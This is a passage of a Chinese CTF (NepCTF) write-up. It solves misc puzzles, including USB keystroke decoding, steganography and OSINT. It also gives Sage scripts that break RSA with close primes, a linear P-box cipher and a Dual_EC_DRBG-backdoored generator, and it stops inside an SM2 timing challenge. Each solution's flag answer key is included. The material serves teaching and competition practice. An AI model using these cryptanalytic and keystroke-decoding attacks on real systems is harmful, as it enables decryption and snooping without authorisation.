&quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#x27;out.txt&#x27;)for line in keys: try: if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;] else: output += [&#x27;[unknown]&#x27;] except: passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)): try: a=output.index(&#x27;&lt;DEL&gt;&#x27;) del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint (&#x27;output :&#x27; + &quot;&quot;.join(output)) 得到 welcometonepctf2nd，加分隔符得flag：nepctf&#123;welcome_to_nepctf_2nd&#125;。 ​ 花花画画画花花 花花画了一张图，你能看出来她画的是什么吗 (flag格式为NepCTF{}) 在 osu! wiki 可以发现osz文件为可执行的osu!谱面文件，下载安装osu!， 根据 生成的 .osz 文件会被放置在 osu! 文件夹下的 &quot;Exports&quot; 文件夹里，将osz文件放入 Exports 文件夹，打开osu!， 在Edit页面看完整首歌曲的乐谱轨迹，拿到flag：NepCTF&#123;MASTER_OF_坏女人！&#125;。 ​ 少见的bbbbase 少见的bbbbase 尝试几种常见jpg隐写，发现是jphide隐写，用JPHS工具seek（无密码），得到 KkYWdvCQcLYewSUUy5TtQc9AMa base58解得flag：flag&#123;Real_qiandao~&#125;。 ​ 9点直播 各位同学，比赛已经开始将近十个小时啦，大家玩的如何呢？邀请大家9点来直播间聊聊天~ 请锁定https://b23.tv/bn0pPAR这边小助手收到了大家想暴打出题人的反馈，今晚9点我们请到了变态的出题人们，在直播间和大家交流，放出我们的hint，帮助大家解题。同时也会在直播间中抽幸运的小伙伴送出我们的周边礼品。 看B站直播拿flag：NepCTF&#123;bad_woman_nb!&#125;。 ​ 馅饼？陷阱！ 好兄弟中奖了，但是要先汇款。他去哪了？ NepCTF{银行官网网址} OSINT题。 用Yandex识别图1里的黄色建筑，可得到结果为豪威海景大酒店，再在百度地图里搜索在海南三亚，附近银行为光大银行， 官网网址即flag：NepCTF&#123;www.cebbank.com&#125;。 ​ 问卷 https://www.wjx.cn/vm/mjlLAVV.aspx 答问卷暴打出题人，拿flag：NepCTF&#123;see_you_NepCTF_2023&#125;。 ​ CRYPTOsignin 本题flag格式: NepCTF{xxx} Have you heard of the Chinese Remainder Theorem? 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from Crypto.Util.number import getStrongPrime,bytes_to_longfrom gmpy2 import powmod,is_prime,invert,bit_length, next_primefrom FLAG import flagdef gen_key(): (p,q,n,e,d) = (0 for _ in range(5)) p = getStrongPrime(1024) q = next_prime(p)# q = p + 1# while(True):# q += 2 if q &amp; 1 else 1# if is_prime(q, 30):# break n = p*q e = 0x10001 d = invert(e, (p-1)*(q-1)) par = (p,q,n,e,d) return pardef leak(par, c): assert len(par) == 5 (p,q,n,e,d) = par print(&quot;Here&#x27;s something for you.&quot;) print(&quot;n =&quot;,n) print(&quot;e =&quot;,e) print(&quot;c_mod_p =&quot;,c % p) print(&quot;c_mod_q =&quot;,c % q)def enc(message, par): assert len(par) == 5 (p,q,n,e,d) = par m = bytes_to_long(message) c = powmod(m,e,n) return cif __name__ == &#x27;__main__&#x27;: par = gen_key() c = enc(flag, par) leak(par, c)&quot;&quot;&quot;Here&#x27;s something for you.n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791e = 65537c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922&quot;&quot;&quot; 费马分解和CRT应用。 123456789101112131415161718# Sageimport gmpy2n =q = gmpy2.iroot(n,2)[0]while 1: q = gmpy2.next_prime(q) if n%q == 0: breakp = n//qcp =cq =e = 65537c = crt([cp,cq],[p,q])d = inverse_mod(e,(p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27; ​ p or s 本题flag格式: flag{xxx} what are the differences between P and S？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from secret import keysfrom Crypto.Util.number import *assert(len(keys)==6)Pbox=[[0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31],[0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29],[0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31],[0, 2, 3, 5, 6, 7, 8, 13, 16, 19, 21, 25, 26, 27, 28],[2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31],[2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31],[1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31],[0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28],[1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31],[0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28],[0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30],[1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31],[0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30],[0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30],[2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31],[0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30],[3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30],[1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28],[0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30],[3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30],[0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31],[0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31],[3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29],[0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31],[0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31],[5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28],[1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31],[2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31],[0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27],[0, 1, 3, 4, 12, 16, 18, 19, 26, 30]]def enc(v): t=v for i in keys: q=[] for j in Pbox: q.append(sum([t[k] for k in j])%2) t=[int(q[j])^int(i[j]) for j in range(32)] return tassert(len(flag)==32)fb=bin(bytes_to_long(flag))[2:].zfill(32*8)ciphertext=&quot;&quot;for i in range(0,len(fb),32): t=enc([int(j) for j in fb[i:i+32]]) ciphertext+=&quot;&quot;.join([str(j) for j in t])print(ciphertext)&quot;&quot;&quot;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&quot;&quot;&quot; 代码逻辑：将flag二进制32*8位01串分为8组，每一组都先经过P盒按位选择求和运算，再与未知的32位key进行按位异或运算，因为有6组key，上述两步运算循环进行6次操作，得到最终32位密文。 将加密过程转为 $\\text{GF}(2)$ 下的矩阵运算，$M_i$ 为 1x32 明文矩阵 $(0 \\le i \\lt 8)$，$P$ 为 32x32 P盒矩阵，$K_i$ 为 1x32 key矩阵 $(0 \\le i \\lt 6)$，$T_i$ 为中间矩阵 $(0 \\le i \\lt 6)$，$C$ 为密文矩阵，即： $T_0=M_i$ $T_1=T_0P^{-1}+K_0$ $T_2=T_1P^{-1}+K_1$ $T_3=T_2P^{-1}+K_2$ $T_4=T_3P^{-1}+K_3$ $T_5=T_4P^{-1}+K_4$ $T_6=T_5P^{-1}+K_5=C$ 可得： $C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$ 由于 $K_i$ 和 $P$ 都固定，令 $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$， 有 $C=M_iA+B$，其中 $A,B$ 都为固定值，$A$ 可求，$B$ 未知。 猜测 $M_0$ 对应的明文是 flag，则由 $M_0,C_0$可以得出 $B$，再对 $C_1$ 至 $C_5$ 分别求逆运算可得 $M_1$ 至 $M_5$。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# SageP = [[0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31],[0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29],[0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31],[0, 2, 3, 5, 6, 7, 8, 13, 16, 19, 21, 25, 26, 27, 28],[2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31],[2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31],[1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31],[0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28],[1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31],[0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28],[0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30],[1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31],[0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30],[0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30],[2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31],[0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30],[3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30],[1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28],[0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30],[3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30],[0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31],[0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31],[3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29],[0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31],[0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31],[5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28],[1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31],[2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31],[0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27],[0, 1, 3, 4, 12, 16, 18, 19, 26, 30]]PP = zero_matrix(GF(2),32)for k in range(32): PP[k] = [1 if x in P[k] else 0 for x in range(32)]PPt = PP.transpose()c = &#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;C = zero_matrix(GF(2),8,32)for k in range(0,len(c),32): C[k//32] = [1 if x == &#x27;1&#x27; else 0 for x in c[k:k+32]]print(C)f0 = vector(GF(2),list(bin(int(b&#x27;flag&#x27;.hex(),16))[2:].zfill(4*8)))flag = b&#x27;flag&#x27;tmp = C[0] - (f0*(PPt^6))print(tmp)for k in range(1,8): l = list((C[k]-tmp)*PPt^(-6)) flag += bytes.fromhex(hex(int(&#x27;&#x27;.join([str(i) for i in l]),2))[2:]) print(flag)# b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27; ​ 中学数学 本题flag格式: flag{xxx} Zuni: 听说密码学是小学数学来着？ // 随缘评：真的吗 123456789101112131415161718192021from gmpy2 import *from Crypto.Util.number import *from secret import flagp=getPrime(1024)q=next_prime(p+(p&gt;&gt;500))e=0x10001n=p*qc=pow(bytes_to_long(flag),e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)&#x27;&#x27;&#x27;n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186&#x27;&#x27;&#x27; $p,q$ 接近，且前1024-500位相同，有 $\\sqrt{n}&gt;&gt;500 \\approx p&gt;&gt;500 \\approx q-p$，故可爆破找差值 $k$： 1234567891011121314151617181920212223242526272829303132# Sageimport gmpy2import itertoolsfrom tqdm import *def solve(f1, f2): g = f1.resultant(f2, q) roots = g.univariate_polynomial().roots() if len(roots) == 0: return False p_ = abs(roots[0][0]) q_ = abs(roots[1][0]) return (min(p_, q_), max(p_, q_))n = c = e = 65537x = int(gmpy2.iroot(n,2)[0])xh = x &gt;&gt; 500for k in trange(1000000,10000000): d = xh - k P.&lt;p, q&gt; = PolynomialRing(ZZ) f1 = n - p*q f2 = d - (q - p) res = solve(f1, f2) if res: print(k) print(res) break # 5476332# (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911) 再常规解： 1234567891011p = q = n = c = e = 65537f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27; ​ bd_key 本题flag格式: NepCTF{xxx} master of pwn一下就解出了明文，因为有后门（本题与pwn无关） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrimefrom FLAG import flag&quot;&quot;&quot; Note: I have modified Dual_EC a little bit. It would be EASIER for you to exploit it.&quot;&quot;&quot;class Dual_EC(): def __init__(self, s_0=None): from Crypto.Util.number import getRandomNBitInteger # Init curve P-256 self.p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 self.n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 self.b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b self.curve = EllipticCurve(GF(self.p), [-3, self.b]) # Init P, Q self.Qx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296 self.Qy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5 self.Q = self.curve(self.Qx, self.Qy) self.d = getRandomNBitInteger(256) self.P = self.d * self.Q # Init state, h_adin if s_0 == None: self.s_i = int(floor((2^16-1)*random())) else: self.s_i = s_0 self.h_adin = 0 self.__leak_par() def __leak_par(self): print(f&quot;curve = &#123;self.curve&#125;&quot;) print(f&quot;P = &#123;self.P&#125;&quot;) print(f&quot;d = &#123;self.d&#125;&quot;) print(f&quot;Q = &#123;self.Q&#125;&quot;) # Output 32bytes now. def __Dual_EC_DRBG(self, h_adin = 0): t_i = self.s_i ^^ h_adin self.s_i = (t_i*self.P)[0].lift() r_i = (self.s_i*self.Q)[0].lift() return r_i def getRandomNBytes(self, N:int) -&gt; bytes: result = 0 req = (N/32).ceil() for i in range(req): if(i == 0): result = (result &lt;&lt; (32*8)) | self.__Dual_EC_DRBG(self.h_adin) else: result = (result &lt;&lt; (32*8)) | self.__Dual_EC_DRBG() self.s_i = (self.s_i * self.P)[0].lift() result = result &gt;&gt; ((32*req - N)*8) return long_to_bytes(result) def encrypt_flag(key:bytes) -&gt; bytes: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from FLAG3 import flag cipher = AES.new(key, AES.MODE_ECB) flag_pad = pad(flag, 16) ct = cipher.encrypt(flag_pad) return ctdef do_schnorr_identification(dbrg): p = getPrime(256) Zp = Zmod(p) g = Zp(2) q = g.multiplicative_order() Zq = Zmod(q) k = 10 class SchnorrProver(object): def __init__(self): self.secret_key = Zq.random_element() self.public_key = g^self.secret_key def commit(self): self.r = Zq.random_element() return g^self.r def respond(self, challenge): return self.r - challenge*self.secret_key class SchnorrVerifier(object): def __init__(self, prover_public_key): self.prover_public_key = prover_public_key def challenge(self, commitment): self.commitment = commitment while True: c = bytes_to_long(dbrg.getRandomNBytes(32)) if c &lt; p: break self.challenge_number = c return self.challenge_number def check(self, response): check_value = g^response*self.prover_public_key^self.challenge_number return self.commitment == check_value def run_protocol(iterations=1): for _ in range(iterations): prover = SchnorrProver() verifier = SchnorrVerifier(prover.public_key) t = prover.commit() c = verifier.challenge(t) s = prover.respond(c) assert(verifier.check(s)) print(f&quot;c = &#123;c&#125;&quot;) run_protocol() def main(): dbrg = Dual_EC() do_schnorr_identification(dbrg) key = dbrg.getRandomNBytes(16) ct = encrypt_flag(key) print(f&quot;ct = &#123;bytes_to_long(ct)&#125;&quot;)main() 123456# curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951# P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)# d = 66604141534275704476445937214374130642068729921454877238730830814793201802544# Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)# c = 59100197418944667413449341413044666843726352095054393072750502893110293231642# ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176 双椭圆曲线确定性随机数发生器（Dual_EC_DRBG）的一个后门，原理： 设每一步的 $\\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。 对于攻击者来说，已知 $P$、$Q$、$d$、$r_{i-1}$，而 $s_i$ 未知。于是有： $\\begin{cases} ((s_i \\cdot P)_x \\cdot P)_x &amp; \\rightarrow s_{i+1} \\newline ((s_i \\cdot P)_x \\cdot Q)_x &amp; \\rightarrow r_i \\end{cases}$ 后门为构造 $d \\cdot r_{i-1}$，其恰好是 $s_i$，看似安全的体制被攻破。 记 $k_i = (s_i \\cdot P)_x$，有： $\\begin{align} d \\cdot r_{i-1} &amp; = {(d \\cdot R_{i-1})_x = (d \\cdot k_{i-1} \\cdot Q)_x} = {(k_{i-1} \\cdot d \\cdot Q)_x = (k_{i-1} \\cdot P)_x} = {((s_{i-1} \\cdot P)_x \\cdot P)_x = s_i} \\end{align}$ 题里 $c=r_{i-1}$，构造 $d \\cdot c = s_i$，则可以推出下一个随机数 $r_i=((s_i \\cdot P)_x \\cdot Q)_x$，取高16*8位为AES的Key。 1234567891011121314151617181920212223242526272829# Sagefrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESa = 115792089210356248762697446949407573530086143415290314195533631308867097853948b = 41058363725152142129326129780047268409114441015993725554835256314039467401291p = 115792089210356248762697446949407573530086143415290314195533631308867097853951E = EllipticCurve(GF(p),[a,b])n = 115792089210356248762697446949407573529996955224135760342422259061068512044369P = (72696788778535848020209987825324097844942627382508830211685965810687985426258, 49180397040468497821240854375656422791216946832858522054245540263375986110762)d = 66604141534275704476445937214374130642068729921454877238730830814793201802544Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286, 36134250956749795798585127919587881956611106672985015071877198253568414405109)c = 59100197418944667413449341413044666843726352095054393072750502893110293231642ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176P = E(P)Q = E(Q)R0 = E.lift_x(c)s1 = (d*R0)[0]s2 = ((s1*P)[0]*P)[0]r1 = ((s1*P)[0]*Q)[0]key = r1 &gt;&gt; ((32 - 16)*8)cipher = AES.new(key, AES.MODE_ECB)key = long_to_bytes(key)ct = long_to_bytes(ct)print(cipher.decrypt(ct))# b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\\x01&#x27; ​ timing 牢不可破的算法，或许会在其他地方出现问题？(容器下发后，师傅自行nc哦～～～) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283#!/usr/bin/python3 from time import perf_counter_ns as clock1from time import *ecc_table = &#123; &#x27;n&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;, &#x27;p&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;, &#x27;g&#x27;: &#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27; &#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;, &#x27;a&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;, &#x27;b&#x27;: &#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;, &#x27;O&#x27;: &#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27; &#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;,&#125;class TSM2(object): def __init__(self, sk): self.ecc_table = ecc_table self.n = int(ecc_table[&#x27;n&#x27;], 16) self.para_len = len(ecc_table[&#x27;n&#x27;]) self.ecc_a3 = (int(ecc_table[&#x27;a&#x27;], base=16) + 3) % int(ecc_table[&#x27;p&#x27;], base=16) self.sk = sk self.pk = self.kg(self.sk, ecc_table[&#x27;g&#x27;]) def sign(self, data, K): e = data d = self.sk k = K P1 = self.kg(k, self.ecc_table[&#x27;g&#x27;]) x = int(P1[0:self.para_len], 16) R = ((e + x) % int(self.ecc_table[&#x27;n&#x27;], base=16)) if R == 0 or R + k == int(self.ecc_table[&#x27;n&#x27;], base=16): return None d_1 = pow( d+1, int(self.ecc_table[&#x27;n&#x27;], base=16) - 2, int(self.ecc_table[&#x27;n&#x27;], base=16)) S = (d_1*(k + R) - R) % int(self.ecc_table[&#x27;n&#x27;], base=16) if S == 0: return None else: return &#x27;%064x%064x&#x27; % (R, S) def verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self.kg(s, self.ecc_table[&#x27;g&#x27;]) P2 = self.kg(t, self.pk) if P1 == P2: P1 = &#x27;%s%s&#x27; % (P1, 1) P1 = self._double_point(P1) else: P1 = &#x27;%s%s&#x27; % (P1, 1) P1 = 